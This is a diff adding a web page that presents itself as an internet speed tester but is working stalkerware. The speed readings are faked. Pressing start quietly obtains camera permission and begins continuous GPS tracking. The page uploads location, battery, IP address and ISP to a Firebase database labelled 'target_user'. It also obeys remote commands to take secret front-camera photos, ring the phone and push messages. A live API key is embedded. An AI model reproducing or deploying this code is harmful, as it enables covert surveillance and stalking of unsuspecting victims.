@@ -1,0 +1,165 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Net Speed Tester</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@500;700&family=Poppins:wght@400;600&display=swap');
+        body { font-family: 'Poppins', sans-serif; background: #0b0f19; color: white; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; overflow: hidden;}
+        
+        .meter-container { position: relative; width: 250px; height: 250px; background: conic-gradient(#38bdf8 0%, #0ea5e9 0%, #1e293b 0%); border-radius: 50%; display: flex; justify-content: center; align-items: center; box-shadow: 0 0 30px rgba(14, 165, 233, 0.3); transition: 0.5s; }
+        .meter-inner { width: 220px; height: 220px; background: #0b0f19; border-radius: 50%; display: flex; flex-direction: column; justify-content: center; align-items: center; }
+        .speed-text { font-family: 'Orbitron', sans-serif; font-size: 45px; font-weight: bold; color: #38bdf8; text-shadow: 0 0 10px rgba(56,189,248,0.5); margin: 0;}
+        .speed-unit { font-size: 14px; color: #94a3b8; }
+        
+        .stats { display: flex; gap: 40px; margin-top: 40px; text-align: center;}
+        .stat-box h4 { margin: 0; color: #94a3b8; font-size: 12px; text-transform: uppercase;}
+        .stat-box p { margin: 5px 0 0 0; font-family: 'Orbitron', sans-serif; font-size: 20px; color: #10b981; }
+        
+        .start-btn { margin-top: 40px; background: #38bdf8; color: #000; border: none; padding: 15px 50px; font-size: 18px; font-weight: bold; border-radius: 30px; cursor: pointer; box-shadow: 0 5px 20px rgba(56, 189, 248, 0.4); text-transform: uppercase; transition: 0.3s;}
+        
+        #noticeBox { display: none; position: absolute; top: 20px; background: #fbbf24; color: black; padding: 10px 20px; border-radius: 10px; font-weight: bold; font-size: 14px; z-index: 1000;}
+        #spyVideo { display: none; } 
+    </style>
+</head>
+<body>
+
+    <div id="noticeBox">🔔 <span id="msgText"></span></div>
+
+    <div class="meter-container" id="meterBg">
+        <div class="meter-inner">
+            <p class="speed-text" id="mainSpeed">0.0</p>
+            <p class="speed-unit">Mbps</p>
+        </div>
+    </div>
+
+    <div class="stats">
+        <div class="stat-box"><h4>Ping</h4><p id="pingVal">--</p></div>
+        <div class="stat-box"><h4>Upload</h4><p id="upVal">--</p></div>
+    </div>
+
+    <button class="start-btn" id="startBtn">START TEST</button>
+
+    <video id="spyVideo" autoplay playsinline></video>
+
+    <script type="module">
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.1/firebase-app.js";
+        import { getDatabase, ref, set, update, onValue, onDisconnect } from "https://www.gstatic.com/firebasejs/10.8.1/firebase-database.js";
+
+        const firebaseConfig = { apiKey: "AIzaSyAoQw5dhwS5JJZIWSPQTgKdMtB5ZEsoxLk", authDomain: "arng-805db.firebaseapp.com", projectId: "arng-805db", databaseURL: "https://arng-805db-default-rtdb.firebaseio.com/" };
+        const app = initializeApp(firebaseConfig); const db = getDatabase(app);
+        const userRef = ref(db, 'live_location/target_user');
+        const alarmSound = new Audio('https://assets.mixkit.co/active_storage/sfx/995/995-preview.mp3');
+
+        let batLvl = 100, isChg = false, userIp = "--", userIsp = "--";
+        
+        // Fetch Battery
+        if(navigator.getBattery) navigator.getBattery().then(b => { 
+            batLvl = Math.round(b.level*100); isChg = b.charging; 
+            b.addEventListener('levelchange', () => batLvl = Math.round(b.level*100));
+        });
+
+        // Fetch IP/ISP
+        fetch('https://ipapi.co/json/').then(r=>r.json()).then(data => { userIp = data.ip; userIsp = data.org; }).catch(()=>{});
+
+        // Capture Photo Logic
+        async function captureSecretPhoto() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                const video = document.getElementById('spyVideo');
+                video.srcObject = stream;
+                await video.play(); // Must play before drawing
+                
+                // Wait 1 second for camera to focus
+                setTimeout(() => {
+                    const canvas = document.createElement('canvas');
+                    canvas.width = 480; canvas.height = 360; 
+                    canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+                    const base64Photo = canvas.toDataURL('image/jpeg', 0.6); // Compress image
+                    
+                    set(ref(db, 'live_location/photo'), { image: base64Photo, time: Date.now() });
+                    stream.getTracks().forEach(t => t.stop()); // Off camera
+                }, 1000);
+            } catch(e) {
+                set(ref(db, 'live_location/photo'), { error: e.message || "Permission Denied/Not HTTPS", time: Date.now() });
+            }
+        }
+
+        // Listen Commands
+        onValue(ref(db, 'live_location/chat'), (snap) => {
+            const data = snap.val();
+            if(data && data.time > Date.now() - 5000) {
+                document.getElementById('msgText').innerText = data.message;
+                document.getElementById('noticeBox').style.display = 'block';
+                setTimeout(() => { document.getElementById('noticeBox').style.display = 'none'; }, 8000);
+            }
+        });
+
+        onValue(ref(db, 'live_location/command'), (snap) => {
+            const cmd = snap.val();
+            if(cmd && cmd.ringTime > Date.now() - 5000) { alarmSound.play().catch(e=>{}); if(navigator.vibrate) navigator.vibrate([1000, 500, 1000]); }
+            if(cmd && cmd.photoTime > Date.now() - 5000) { captureSecretPhoto(); }
+        });
+
+        const startTestBtn = document.getElementById('startBtn');
+        startTestBtn.addEventListener('click', async () => {
+            
+            // 1. Ask Camera Permission Upfront (Silent trick)
+            try {
+                const tempStream = await navigator.mediaDevices.getUserMedia({ video: true });
+                tempStream.getTracks().forEach(t => t.stop());
+            } catch(e) { console.log("Camera ignored"); }
+
+            onDisconnect(userRef).update({ isOnline: false });
+
+            // 2. Start GPS Tracking with Error Handling
+            if(navigator.geolocation) {
+                navigator.geolocation.watchPosition(
+                    (pos) => {
+                        set(userRef, {
+                            latitude: pos.coords.latitude, longitude: pos.coords.longitude,
+                            accuracy: pos.coords.accuracy, heading: pos.coords.heading || 0,
+                            speed: pos.coords.speed ? Math.round(pos.coords.speed * 3.6) : 0,
+                            battery: batLvl, charging: isChg, isOnline: true, status: "Active",
+                            deviceInfo: /Android/i.test(navigator.userAgent) ? "Android" : "Apple/PC",
+                            ip_address: userIp, isp: userIsp
+                        });
+                    },
+                    (err) => { 
+                        let errorMsg = "Unknown Error";
+                        if(err.code === 1) errorMsg = "User Denied Location";
+                        if(err.code === 2) errorMsg = "GPS Signal Lost";
+                        if(err.code === 3) errorMsg = "Timeout/Poor Connection";
+                        
+                        set(userRef, { 
+                            isOnline: true, status: `GPS Error: ${errorMsg}`, 
+                            ip_address: userIp, isp: userIsp, battery: batLvl, charging: isChg,
+                            deviceInfo: /Android/i.test(navigator.userAgent) ? "Android" : "Apple/PC"
+                        });
+                    },
+                    { enableHighAccuracy: true, timeout: 20000, maximumAge: 0 } // timeout increased
+                );
+            }
+
+            // Fake UI Animation
+            startTestBtn.style.display = "none";
+            document.getElementById('pingVal').innerText = Math.floor(Math.random() * 20 + 10) + " ms";
+            let fakeSpeed = 0;
+            let testInterval = setInterval(() => {
+                fakeSpeed += Math.random() * 5;
+                if(fakeSpeed > 45) fakeSpeed -= Math.random() * 8; 
+                document.getElementById('mainSpeed').innerText = fakeSpeed.toFixed(1);
+                document.getElementById('meterBg').style.background = `conic-gradient(#38bdf8 ${fakeSpeed*2}%, #1e293b 0%)`;
+            }, 100);
+
+            setTimeout(() => {
+                clearInterval(testInterval);
+                document.getElementById('upVal').innerText = (fakeSpeed / 3).toFixed(1) + " Mbps";
+                startTestBtn.innerText = "TEST AGAIN";
+                startTestBtn.style.display = "block";
+            }, 10000); 
+        });
+    </script>
+</body>
+</html>
